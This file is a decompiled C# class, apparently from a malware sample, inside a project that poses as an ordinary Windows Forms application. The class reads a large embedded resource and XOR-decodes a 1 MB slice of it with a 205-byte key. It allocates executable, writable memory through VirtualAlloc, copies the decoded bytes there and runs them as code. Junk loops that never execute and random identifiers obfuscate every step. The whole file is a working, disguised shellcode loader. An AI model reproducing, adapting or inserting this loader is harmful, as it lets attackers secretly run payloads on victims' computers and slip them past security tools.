using System;
using System.Runtime.InteropServices;
using WindowsFormsApplication.Properties;

namespace WindowsFormsApplication;

internal class Class1
{
	[Flags]
	public enum AllocationType : uint
	{
		COMMIT = 0x1000u,
		RESERVE = 0x2000u,
		RESET = 0x80000u,
		LARGE_PAGES = 0x20000000u,
		PHYSICAL = 0x400000u,
		TOP_DOWN = 0x100000u,
		WRITE_WATCH = 0x200000u
	}

	[Flags]
	public enum MemoryProtection : uint
	{
		EXECUTE = 0x10u,
		EXECUTE_READ = 0x20u,
		EXECUTE_READWRITE = 0x40u,
		EXECUTE_WRITECOPY = 0x80u,
		NOACCESS = 1u,
		READONLY = 2u,
		READWRITE = 4u,
		WRITECOPY = 8u,
		GUARD_Modifierflag = 0x100u,
		NOCACHE_Modifierflag = 0x200u,
		WRITECOMBINE_Modifierflag = 0x400u
	}

	private delegate int jkjfhzwah();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

	public static int bvggde(int zsurbjsndn, int kgcylzmgftv)
	{
		byte[] array = new byte[1279984];
		byte b = 166;
		byte b2 = 109;
		byte b3 = 33;
		byte b4 = 175;
		byte b5 = 247;
		byte b6 = 168;
		byte b7 = 171;
		byte b8 = 218;
		byte b9 = 38;
		byte b10 = 191;
		byte b11 = 190;
		byte b12 = 224;
		byte b13 = 168;
		byte b14 = 37;
		byte b15 = 79;
		byte b16 = 45;
		byte b17 = 226;
		while (b > 41 && b2 > 93 && b3 >= 71 && b4 > 194 && b5 <= 101 && b6 != 247 && b7 < 39 && b8 != 213 && b9 > 26 && b10 <= 209 && b11 < 175 && b12 >= 220 && b13 > 191 && b14 <= 46 && b15 == 34 && b16 <= 41 && b17 != 22)
		{
			b = (byte)(b - 1);
			b2 = (byte)(b2 + 1);
			b3 = (byte)(b3 - 1);
			b4 = (byte)(b4 + 1);
			b5 = (byte)(b5 - 1);
			b6 = (byte)(b6 + 1);
			b7 = (byte)(b7 - 1);
			b8 = (byte)(b8 + 1);
			b9 = (byte)(b9 + 1);
			b10 = (byte)(b10 - 1);
			b11 = (byte)(b11 - 1);
			b12 = (byte)(b12 + 1);
			b13 = (byte)(b13 - 1);
			b14 = (byte)(b14 + 1);
			b15 = (byte)(b15 - 1);
			b16 = (byte)(b16 + 1);
			b17 = (byte)(b17 - 1);
		}
		byte[] array2 = new byte[205]
		{
			52, 52, 52, 52, 52, 52, 52, 52, 52, 52,
			52, 52, 52, 52, 52, 52, 52, 52, 52, 52,
			52, 52, 52, 52, 52, 52, 52, 13, 42, 42,
			42, 42, 42, 42, 42, 42, 42, 42, 42, 42,
			42, 42, 42, 42, 42, 42, 42, 42, 42, 42,
			42, 42, 42, 42, 42, 42, 42, 42, 42, 42,
			42, 42, 42, 42, 42, 42, 42, 42, 91, 131,
			228, 228, 228, 228, 228, 228, 228, 228, 228, 228,
			228, 228, 228, 228, 228, 228, 228, 228, 228, 228,
			228, 228, 228, 228, 228, 228, 228, 228, 228, 228,
			228, 228, 228, 228, 228, 228, 228, 228, 228, 228,
			228, 228, 228, 228, 228, 228, 228, 228, 228, 228,
			228, 32, 81, 203, 181, 181, 181, 181, 181, 181,
			181, 181, 181, 181, 181, 181, 181, 181, 181, 181,
			181, 181, 181, 181, 181, 181, 181, 181, 181, 181,
			181, 181, 181, 181, 181, 181, 181, 181, 181, 99,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164, 164, 164, 164, 164, 164,
			164, 164, 164, 164, 164
		};
		int num = 0;
		Resources.gbwohe.Read(array, 0, 1279984);
		byte b18 = 95;
		byte b19 = 62;
		byte b20 = 102;
		byte b21 = 196;
		byte b22 = 10;
		byte b23 = 106;
		byte b24 = 70;
		byte b25 = 220;
		byte b26 = 148;
		byte b27 = 52;
		byte b28 = 159;
		byte b29 = 170;
		byte b30 = 176;
		byte b31 = 205;
		byte b32 = 6;
		byte b33 = 216;
		byte b34 = 169;
		byte b35 = 70;
		while (b18 <= 192 && b19 <= 165 && b20 <= 161 && b21 <= 47 && b22 <= 142 && b23 <= 139 && b24 != 151 && b25 == 178 && b26 < 251 && b27 == 50 && b28 >= 196 && b29 != 234 && b30 < 191 && b31 < 95 && b32 != 38 && b33 >= 127 && b34 != 121 && b35 > 113)
		{
			b18 = (byte)(b18 - 1);
			b19 = (byte)(b19 + 1);
			b20 = (byte)(b20 + 1);
			b21 = (byte)(b21 + 1);
			b22 = (byte)(b22 - 1);
			b23 = (byte)(b23 - 1);
			b24 = (byte)(b24 + 1);
			b25 = (byte)(b25 - 1);
			b26 = (byte)(b26 - 1);
			b27 = (byte)(b27 - 1);
			b28 = (byte)(b28 - 1);
			b29 = (byte)(b29 - 1);
			b30 = (byte)(b30 + 1);
			b31 = (byte)(b31 - 1);
			b32 = (byte)(b32 + 1);
			b33 = (byte)(b33 + 1);
			b34 = (byte)(b34 + 1);
			b35 = (byte)(b35 - 1);
		}
		IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (IntPtr)1081402, AllocationType.COMMIT | AllocationType.RESERVE, MemoryProtection.EXECUTE_READWRITE);
		for (byte b36 = 131; b36 < 41; b36 = (byte)(b36 - 1))
		{
		}
		while (num != 1081402)
		{
			byte b37 = 72;
			byte b38 = 174;
			byte b39 = 20;
			byte b40 = 19;
			byte b41 = 207;
			byte b42 = 231;
			byte b43 = 210;
			byte b44 = 41;
			byte b45 = 246;
			byte b46 = 191;
			byte b47 = 91;
			byte b48 = 212;
			byte b49 = 143;
			byte b50 = 105;
			byte b51 = 203;
			byte b52 = 199;
			byte b53 = 144;
			byte b54 = 90;
			while (b37 <= 45 && b38 == 15 && b39 != 43 && b40 < 195 && b41 >= 170 && b42 <= 127 && b43 > 219 && b44 <= 124 && b45 > 201 && b46 == 178 && b47 < 22 && b48 == 147 && b49 <= 105 && b50 > 232 && b51 > 178 && b52 == 115 && b53 < 114 && b54 < 2)
			{
				b37 = (byte)(b37 - 1);
				b38 = (byte)(b38 + 1);
				b39 = (byte)(b39 - 1);
				b40 = (byte)(b40 + 1);
				b41 = (byte)(b41 - 1);
				b42 = (byte)(b42 + 1);
				b43 = (byte)(b43 + 1);
				b44 = (byte)(b44 - 1);
				b45 = (byte)(b45 + 1);
				b46 = (byte)(b46 - 1);
				b47 = (byte)(b47 + 1);
				b48 = (byte)(b48 + 1);
				b49 = (byte)(b49 - 1);
				b50 = (byte)(b50 + 1);
				b51 = (byte)(b51 - 1);
				b52 = (byte)(b52 - 1);
				b53 = (byte)(b53 + 1);
				b54 = (byte)(b54 - 1);
			}
			int num2 = num % 205;
			byte b55 = 58;
			byte b56 = 51;
			byte b57 = 100;
			byte b58 = 48;
			byte b59 = 75;
			byte b60 = 52;
			byte b61 = 14;
			byte b62 = 55;
			byte b63 = 46;
			byte b64 = 243;
			byte b65 = 82;
			while (b55 < 202 && b56 != 52 && b57 >= 55 && b58 == 71 && b59 != 112 && b60 >= 247 && b61 <= 141 && b62 >= 153 && b63 == 41 && b64 >= 120 && b65 > 199)
			{
				b55 = (byte)(b55 + 1);
				b56 = (byte)(b56 + 1);
				b57 = (byte)(b57 - 1);
				b58 = (byte)(b58 - 1);
				b59 = (byte)(b59 - 1);
				b60 = (byte)(b60 - 1);
				b61 = (byte)(b61 + 1);
				b62 = (byte)(b62 - 1);
				b63 = (byte)(b63 + 1);
				b64 = (byte)(b64 + 1);
				b65 = (byte)(b65 - 1);
			}
			array[num + 198582] ^= array2[num2];
			byte b66 = 121;
			byte b67 = 231;
			byte b68 = 203;
			byte b69 = 100;
			byte b70 = 193;
			byte b71 = 161;
			byte b72 = 52;
			byte b73 = 146;
			byte b74 = 11;
			byte b75 = 208;
			byte b76 = 229;
			byte b77 = 14;
			byte b78 = 146;
			while (b66 < 54 && b67 <= 38 && b68 >= 82 && b69 > 181 && b70 <= 213 && b71 < 19 && b72 > 133 && b73 != 85 && b74 >= 252 && b75 != 159 && b76 >= 144 && b77 < 42 && b78 >= 248)
			{
				b66 = (byte)(b66 - 1);
				b67 = (byte)(b67 + 1);
				b68 = (byte)(b68 + 1);
				b69 = (byte)(b69 - 1);
				b70 = (byte)(b70 + 1);
				b71 = (byte)(b71 - 1);
				b72 = (byte)(b72 + 1);
				b73 = (byte)(b73 - 1);
				b74 = (byte)(b74 - 1);
				b75 = (byte)(b75 + 1);
				b76 = (byte)(b76 - 1);
				b77 = (byte)(b77 - 1);
				b78 = (byte)(b78 + 1);
			}
			num++;
			byte b79 = 147;
			byte b80 = 251;
			byte b81 = 107;
			byte b82 = 63;
			while (b79 >= 125 && b80 > 204 && b81 <= 17 && b82 != 21)
			{
				b79 = (byte)(b79 - 1);
				b80 = (byte)(b80 + 1);
				b81 = (byte)(b81 - 1);
				b82 = (byte)(b82 - 1);
			}
		}
		byte b83 = 158;
		byte b84 = 162;
		byte b85 = 183;
		byte b86 = 61;
		byte b87 = 203;
		byte b88 = 223;
		byte b89 = 148;
		byte b90 = 156;
		byte b91 = 94;
		byte b92 = 146;
		byte b93 = 177;
		while (b83 == 195 && b84 >= 184 && b85 < 201 && b86 < 17 && b87 > 120 && b88 == 121 && b89 != 240 && b90 == 231 && b91 <= 14 && b92 < 129 && b93 >= 15)
		{
			b83 = (byte)(b83 + 1);
			b84 = (byte)(b84 - 1);
			b85 = (byte)(b85 - 1);
			b86 = (byte)(b86 - 1);
			b87 = (byte)(b87 + 1);
			b88 = (byte)(b88 + 1);
			b89 = (byte)(b89 - 1);
			b90 = (byte)(b90 + 1);
			b91 = (byte)(b91 + 1);
			b92 = (byte)(b92 + 1);
			b93 = (byte)(b93 - 1);
		}
		jkjfhzwah jkjfhzwah = (jkjfhzwah)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(jkjfhzwah));
		byte b94 = 111;
		byte b95 = 0;
		byte b96 = 76;
		byte b97 = 12;
		byte b98 = 177;
		byte b99 = 254;
		byte b100 = 125;
		byte b101 = 157;
		byte b102 = 216;
		byte b103 = 72;
		byte b104 = 171;
		byte b105 = 79;
		while (b94 >= 64 && b95 == 84 && b96 < 97 && b97 <= 135 && b98 >= 191 && b99 < 6 && b100 < 162 && b101 != 249 && b102 >= 76 && b103 >= 203 && b104 == 81 && b105 == 46)
		{
			b94 = (byte)(b94 - 1);
			b95 = (byte)(b95 + 1);
			b96 = (byte)(b96 - 1);
			b97 = (byte)(b97 - 1);
			b98 = (byte)(b98 + 1);
			b99 = (byte)(b99 + 1);
			b100 = (byte)(b100 - 1);
			b101 = (byte)(b101 + 1);
			b102 = (byte)(b102 + 1);
			b103 = (byte)(b103 - 1);
			b104 = (byte)(b104 - 1);
			b105 = (byte)(b105 + 1);
		}
		Marshal.Copy(array, 198582, intPtr, 1081402);
		return jkjfhzwah();
	}
}
